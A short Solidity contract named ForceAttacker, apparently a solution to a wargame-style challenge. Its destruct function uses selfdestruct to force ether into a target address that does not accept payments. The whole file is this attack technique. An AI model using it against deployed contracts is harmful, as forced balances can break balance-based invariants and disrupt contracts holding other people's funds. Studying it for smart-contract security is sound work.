pragma solidity ^0.8.0;

contract ForceAttacker {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}